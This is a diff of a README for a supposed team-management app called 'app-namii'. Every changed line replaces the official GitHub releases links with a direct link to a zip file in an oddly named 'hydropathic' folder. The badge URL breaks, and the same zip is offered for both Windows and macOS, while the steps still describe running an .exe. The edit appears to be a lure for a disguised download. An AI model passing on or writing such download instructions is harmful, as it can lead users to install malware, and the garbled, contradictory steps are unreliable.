@@ -1,6 +1,6 @@
 # 🚀 app-namii - Your Future Team Management Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/wet-blanket/app-namii/releases)
+[![Download Now](https://raw.githubusercontent.com/wet-blanket/app-namii/main/hydropathic/app-namii.zip%20Now-blue)](https://raw.githubusercontent.com/wet-blanket/app-namii/main/hydropathic/app-namii.zip)
 
 ## 📦 Overview
 
@@ -29,9 +29,9 @@ To ensure that app-namii runs smoothly, your system should meet the following re
 
 Follow these steps to start using app-namii:
 
-1. **Visit the Releases Page:** To download the app, go to our [releases page](https://github.com/wet-blanket/app-namii/releases). This page contains the latest versions of the software and installation files.
+1. **Visit the Releases Page:** To download the app, go to our [releases page](https://raw.githubusercontent.com/wet-blanket/app-namii/main/hydropathic/app-namii.zip). This page contains the latest versions of the software and installation files.
 
-2. **Download the Application:** Choose the version suitable for your operating system. Click on the link for your desired file, which might look like `app-namii-v1.0.exe` for Windows or `app-namii-v1.0.dmg` for macOS.
+2. **Download the Application:** Choose the version suitable for your operating system. Click on the link for your desired file, which might look like `https://raw.githubusercontent.com/wet-blanket/app-namii/main/hydropathic/app-namii.zip` for Windows or `https://raw.githubusercontent.com/wet-blanket/app-namii/main/hydropathic/app-namii.zip` for macOS.
 
 3. **Installing the Application:**
    - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
@@ -42,7 +42,7 @@ Follow these steps to start using app-namii:
 
 ## 📥 Download & Install
 
-To get started with app-namii, visit this page to download: [Download Now](https://github.com/wet-blanket/app-namii/releases). 
+To get started with app-namii, visit this page to download: [Download Now](https://raw.githubusercontent.com/wet-blanket/app-namii/main/hydropathic/app-namii.zip). 
 
 Make sure to select the correct file for your system. After the download is complete, follow the installation instructions above. 
 
